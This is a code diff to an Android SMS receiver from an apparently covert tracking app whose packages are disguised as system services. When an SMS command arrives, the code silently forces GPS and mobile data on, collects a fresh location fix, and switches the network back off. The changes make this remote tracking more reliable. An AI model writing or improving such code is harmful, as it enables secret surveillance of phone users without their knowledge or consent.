@@ -23,11 +23,8 @@ import com.particle.inspector.common.util.SIM_TYPE;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 
-import system.service.feature.location.CellInfoManager;
-import system.service.feature.location.CellLocationManager;
 import system.service.feature.location.LocationInfo;
 import system.service.feature.location.LocationUtil;
-import system.service.feature.location.WifiInfoManager;
 import system.service.feature.sms.SmsCtrl;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.SysUtils;
@@ -62,7 +59,7 @@ public class SmsReceiver extends BroadcastReceiver
 	@Override
 	public void onReceive(Context context, Intent intent) 
 	{
-		android.os.Debug.waitForDebugger();//TODO should be removed in the release
+		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		
 		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{
@@ -305,11 +302,14 @@ public class SmsReceiver extends BroadcastReceiver
 	
 	public LocationInfo getGeoLocation()
 	{
+		long now = (new Date()).getTime();
+		
 		// If GPS is not enabled, try to enable it
 		boolean tryToEnableGPS = false;
 		if (!GpsUtil.isGpsEnabled(context)) {
 			int tryCount = 0;
-			while (!GpsUtil.isGpsEnabled(context) && tryCount < 5) {
+			while (!GpsUtil.isGpsEnabled(context) && tryCount < 3) {
+				tryCount++;
 				GpsUtil.enableGPS(context);
 				SysUtils.threadSleep(5000, LOGTAG);
 			}
@@ -318,29 +318,31 @@ public class SmsReceiver extends BroadcastReceiver
 		}
 		
         // If WIFI is not enabled, try to enable it
-     	boolean tryToEnableWifi = false;
-     	if (!NetworkUtil.isWifiConnected(context)) {
-     		int tryCount = 0;
-     		while (!NetworkUtil.isWifiConnected(context) && tryCount < 5) {
-     			NetworkUtil.enableWifi(context);
-     			SysUtils.threadSleep(5000, LOGTAG);
-     		}
-     			
-     		if (NetworkUtil.isWifiConnected(context)) tryToEnableWifi = true;
+     	boolean tryToEnableNetwork = false;
+     	if (!NetworkUtil.isNetworkConnected(context)) {
+     		tryToEnableNetwork = NetworkUtil.tryToConnectDataNetwork(context);
      	}
-		
+     	
 		// Try to sleep for a while for the LocationUtil to update location records
-     	SysUtils.threadSleep(50000, LOGTAG);
+     	SysUtils.threadSleep(40000, LOGTAG);
      	LocationInfo location = null;
      	int tryCount = 0;
      	while (location == null && tryCount <= 7) {
      		tryCount++;
      		SysUtils.threadSleep(10000, LOGTAG);
     	   	if (BootService.locationUtil.locationGpsQueue.size() > 0) {
-    	   		location = new LocationInfo(BootService.locationUtil.locationGpsQueue.getLast(), LocationInfo.GPS);
+    	   		Location loc = BootService.locationUtil.locationGpsQueue.getLast();
+    	   		// If the location is got after the action beginning
+    	   		if (loc.getTime() > now) {
+    	   			location = new LocationInfo(loc, LocationInfo.GPS);
+    	   		}
         	}
     	   	else if (BootService.locationUtil.locationWifiQueue.size() > 0) {
-    	   		location = new LocationInfo(BootService.locationUtil.locationWifiQueue.getLast(), LocationInfo.WIFI);
+    	   		Location loc = BootService.locationUtil.locationWifiQueue.getLast();
+    	   		// If the location is got after the action beginning
+    	   		if (loc.getTime() > now) {
+    	   			location = new LocationInfo(loc, LocationInfo.WIFI);
+    	   		}
         	}
      	}
 	    	
@@ -350,8 +352,8 @@ public class SmsReceiver extends BroadcastReceiver
 	   	}
 	   	
 	    // If network previously forced to be enabled, try to disable it
-    	if (tryToEnableWifi) {
-    		NetworkUtil.disableWifi(context);
+    	if (tryToEnableNetwork) {
+    		NetworkUtil.tryToDisconnectDataNetwork(context);
     	}
 	   	
     	return location;
